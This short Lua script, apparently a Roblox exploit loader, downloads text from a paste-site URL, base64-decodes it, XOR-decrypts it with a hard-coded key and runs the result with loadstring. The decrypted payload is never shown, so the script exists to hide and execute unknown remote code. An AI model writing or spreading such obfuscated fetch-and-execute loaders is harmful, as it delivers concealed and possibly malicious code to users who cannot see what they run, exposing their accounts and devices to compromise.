local k={17,73,86,211,107,148,93,3,247,103,11,122,68,122,174,52}
local u="https://pastefy.app/XuGPhDXx/raw"

local d=game:HttpGet(u)
if not d or #d<10 then return end
local bmap={}
local s="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
for i=1,#s do bmap[s:sub(i,i)]=i-1 end
local o={}
local buf=0
local bits=0
for i=1,#d do
  local c=d:sub(i,i)
  if c=="=" then break end
  local v=bmap[c]
  if v then
    buf=buf*64+v
    bits=bits+6
    if bits>=8 then
      bits=bits-8
      o[#o+1]=string.char(bit32.band(bit32.rshift(buf,bits),255))
      buf=buf%2^bits
    end
  end
end
local raw=table.concat(o)
local res={}
for i=1,#raw do
  res[i]=string.char(bit32.bxor(string.byte(raw,i),k[((i-1)%16)+1]))
end
local code=table.concat(res)
local fn=(loadstring or load)(code)
if fn then fn() end
